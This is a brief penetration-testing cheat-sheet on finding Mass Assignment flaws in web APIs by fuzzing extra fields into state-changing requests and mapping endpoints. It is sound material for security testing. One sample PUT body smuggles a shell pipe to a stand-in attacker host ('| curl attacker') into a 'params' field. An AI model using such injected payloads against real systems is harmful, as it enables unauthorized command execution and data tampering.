# Detection
- Look for the data returning URLs, collect all objects and fields.
- Identify stat-changing requests, such as create or update variuos properties.
- Try to add object keys in the state-changing requests.
- Sometimes, hidden parameter discovery is useful to get an unexpected result.
  - It will not result to Mass Assignment, but we can see errors that may result in other vulnerabilities.
  ```bash
  POST /v1/merchant/shop-account/

  {
    "name": "ehsan",
    "email": "bs.ebadi@gmail.com",
    "FUZZ": "test"
  }
  ```

# Tip
- To initialize or overwrite server-side variables, We should find the **field name** and it's **value**.
  - Fuzz
  - Check all endpoints of web-app. (Narrow Recon)
    ```html
    GET /api/my_videos
    (Request Body)
    {
      [
       {"name": "name", "format": "m4a", "params": null},
       {"name": "my_video", "format": "mp4", "params": "-v codec h264"},
      ]
    }
    ```
    ```html
    PUT /api/videos/574
    (Request Body)
    {"name": "a", "format": "mp4", "params": "-v codec h264 | curl attacker"}
    ```
  - Manually surf the web application, extract the Burp site-map, then extract fields name from it.

# Resource
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment
